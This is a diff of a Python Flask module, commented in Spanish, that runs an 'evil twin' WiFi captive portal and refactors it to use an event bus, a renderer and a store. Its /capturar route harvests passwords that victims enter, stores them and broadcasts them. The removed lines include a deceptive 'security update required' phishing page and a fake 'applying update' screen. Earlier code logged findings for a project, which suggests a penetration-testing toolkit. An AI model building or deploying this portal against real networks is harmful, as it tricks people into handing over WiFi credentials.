@@ -1,23 +1,58 @@
 from __future__ import annotations
 
+import errno
 import logging
+import socket
 import sys
 import threading
-from typing import TYPE_CHECKING, Callable
+from typing import TYPE_CHECKING
 
 from flask import Flask, render_template, request
+from werkzeug.serving import make_server
+
+from evil_twin_events import EventBus, EventoCaptura
+from evil_twin_renderer import PortalRenderer
+from evil_twin_store import CapturaStore
 
 if TYPE_CHECKING:
     from core.log_sistema import LogSistema
-    from core.GestorProyectos import GestorProyectos
 
-# Silenciar logs de Werkzeug — ruido innecesario en terminal táctica
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
 
-# Suprimir el banner de Flask sin modificar el objeto app
 _flask_cli = sys.modules.get("flask.cli")
 if _flask_cli and hasattr(_flask_cli, "show_server_banner"):
     _flask_cli.show_server_banner = lambda *_: None
+
+
+class EvilTwinError(Exception):
+    pass
+
+
+class PortOcupadoError(EvilTwinError):
+    def __init__(self, host: str, port: int) -> None:
+        self.host = host
+        self.port = port
+        super().__init__(
+            f"Puerto {port} en {host!r} ya está ocupado.\n"
+            f"  • Cambia el puerto: EvilTwinServer(port=8080)\n"
+            f"  • Libera el proceso: sudo fuser -k {port}/tcp"
+        )
+
+
+class ServidorYaActivoError(EvilTwinError):
+    pass
+
+
+def _verificar_puerto(host: str, port: int) -> None:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            s.bind((host, port))
+        except OSError as exc:
+            if exc.errno == errno.EADDRINUSE:
+                raise PortOcupadoError(host, port) from exc
+            raise
+
 
 class EvilTwinServer:
 
@@ -30,44 +65,81 @@ class EvilTwinServer:
         host: str = DEFAULT_HOST,
         port: int = DEFAULT_PORT,
         log: LogSistema | None = None,
-        gp: GestorProyectos | None = None,
-        on_captura: Callable[[str], None] | None = None,
+        bus: EventBus | None = None,
+        renderer: PortalRenderer | None = None,
+        store: CapturaStore | None = None,
     ) -> None:
-        self.ssid       = ssid
-        self.host       = host
-        self.port       = port
-        self._log       = log
-        self._gp        = gp
-        self._on_captura = on_captura
-        self._capturas: list[str] = []
-        self._app       = self._crear_app()
-        self._hilo: threading.Thread | None = None
+        self.ssid = ssid
+        self.host = host
+        self.port = port
 
-    # API pública
+        self._log      = log
+        self._bus      = bus or EventBus()
+        self._renderer = renderer or PortalRenderer()
+        self._store    = store or CapturaStore()
+
+        self._srv:  make_server | None    = None
+        self._hilo: threading.Thread | None = None
+        self._lock  = threading.Lock()
+
+        self._app = self._crear_app()
+
     def iniciar(self) -> threading.Thread:
-        self._hilo = threading.Thread(
-            target=self._app.run,
-            kwargs={
-                "host":        self.host,
-                "port":        self.port,
-                "use_reloader": False,
-                "threaded":    True,
-            },
-            daemon=True,
-            name="evil-twin-flask",
-        )
-        self._hilo.start()
-        self._registrar("info", f"Portal cautivo activo en {self.host}:{self.port}")
+        with self._lock:
+            if self.esta_vivo():
+                raise ServidorYaActivoError(
+                    f"El servidor ya está activo en {self.host}:{self.port}."
+                )
+            _verificar_puerto(self.host, self.port)
+            self._srv = make_server(self.host, self.port, self._app, threaded=True)
+            self._hilo = threading.Thread(
+                target=self._srv.serve_forever,
+                daemon=True,
+                name="evil-twin-flask",
+            )
+            self._hilo.start()
+
+        self._log_info(f"Portal cautivo activo en {self.host}:{self.port}")
         return self._hilo
+
+    def detener(self, timeout: float = 5.0) -> bool:
+        with self._lock:
+            if self._srv is None:
+                return True
+            self._srv.shutdown()
+            self._srv.server_close()
+            self._srv = None
+
+        if self._hilo:
+            self._hilo.join(timeout=timeout)
+            vivo = self._hilo.is_alive()
+            self._hilo = None
+            if vivo:
+                self._log_warning("El hilo del servidor no terminó a tiempo.")
+                return False
+
+        self._log_info("Portal cautivo detenido limpiamente.")
+        return True
+
+    def reiniciar(self, timeout: float = 5.0) -> threading.Thread:
+        self.detener(timeout=timeout)
+        return self.iniciar()
 
     def esta_vivo(self) -> bool:
         return self._hilo is not None and self._hilo.is_alive()
 
     @property
     def capturas(self) -> list[str]:
-        return list(self._capturas)
+        return self._store.snapshot()
 
-    # Construcción de la app Flask
+    @property
+    def total_capturas(self) -> int:
+        return self._store.total()
+
+    @property
+    def bus(self) -> EventBus:
+        return self._bus
+
     def _crear_app(self) -> Flask:
         app = Flask(__name__)
 
@@ -77,80 +149,44 @@ class EvilTwinServer:
             try:
                 return render_template("index.html", ssid=self.ssid)
             except Exception:
-                return self._fallback_portal()
+                return self._renderer.portal(self.ssid)
 
         @app.route("/capturar", methods=["POST"])
         def capturar() -> str:
             password = request.form.get("password", "").strip()
             if password:
-                self._registrar_captura(password)
-            return self._pantalla_cierre()
+                total = self._store.agregar(password)
+                self._log_info(f"Credencial capturada — SSID: {self.ssid}")
+                self._bus.emitir(EventoCaptura(
+                    ssid=self.ssid,
+                    password=password,
+                    total=total,
+                ))
+            return self._renderer.cierre()
 
         return app
 
-    # Manejo de capturas
-    def _registrar_captura(self, password: str) -> None:
-        self._capturas.append(password)
-        self._registrar("audit", f"Credencial capturada — SSID: {self.ssid}")
-
-        # Guardar en evidencias del proyecto activo
-        if self._gp and self._gp.proyecto_activo:
-            self._gp.registrar_hallazgo(
-                "CRITICO",
-                "Credencial WiFi capturada",
-                f"SSID: {self.ssid}",
-                "Cambiar la contraseña del access point objetivo.",
-            )
-            self._gp.registrar_evidencia(
-                "evil_twin_captura",
-                f"Credencial obtenida en portal cautivo SSID: {self.ssid}",
-                {"ssid": self.ssid, "total_capturas": len(self._capturas)},
-            )
-
-        # Callback externo opcional (p.ej. para actualizar la UI en tiempo real)
-        if self._on_captura:
-            try:
-                self._on_captura(password)
-            except Exception:
-                pass
-
-    # Plantillas HTML de fallback
-    @staticmethod
-    def _fallback_portal() -> str:
-        return (
-            "<!DOCTYPE html><html><head><meta charset='utf-8'>"
-            "<meta name='viewport' content='width=device-width,initial-scale=1'>"
-            "<title>Actualización de red</title></head>"
-            "<body style='font-family:sans-serif;text-align:center;padding:40px'>"
-            "<h2>Actualización de seguridad requerida</h2>"
-            "<form method='POST' action='/capturar'>"
-            "<input type='password' name='password' placeholder='Contraseña WiFi' "
-            "style='padding:8px;width:240px;margin:12px 0'><br>"
-            "<button type='submit' style='padding:8px 24px'>Conectar</button>"
-            "</form></body></html>"
-        )
-
-    @staticmethod
-    def _pantalla_cierre() -> str:
-        return (
-            "<!DOCTYPE html><html><head><meta charset='utf-8'>"
-            "<title>Conectando...</title></head>"
-            "<body style='font-family:sans-serif;text-align:center;padding:50px'>"
-            "<h2 style='color:#1a73e8'>Aplicando actualización...</h2>"
-            "<p>Su conexión se restablecerá en breve.</p>"
-            "</body></html>"
-        )
-
-    # Logging interno
-    def _registrar(self, nivel: str, mensaje: str) -> None:
+    def _log_info(self, mensaje: str) -> None:
         if self._log:
-            getattr(self._log, nivel, self._log.info)(mensaje, "EvilTwin")
+            self._log.info(mensaje, "EvilTwin")
 
-# Factory function — mantiene compatibilidad con ModuleRegistry
+    def _log_warning(self, mensaje: str) -> None:
+        if self._log:
+            self._log.warning(mensaje, "EvilTwin")
+
+    def __enter__(self) -> EvilTwinServer:
+        self.iniciar()
+        return self
+
+    def __exit__(self, *_: object) -> None:
+        self.detener()
+
+
 def iniciar_servidor(
     ssid: str = "Red_Publica",
     log: LogSistema | None = None,
-    gp: GestorProyectos | None = None,
-) -> None:
-    servidor = EvilTwinServer(ssid=ssid, log=log, gp=gp)
+    bus: EventBus | None = None,
+) -> EvilTwinServer:
+    servidor = EvilTwinServer(ssid=ssid, log=log, bus=bus)
     servidor.iniciar()
+    return servidor
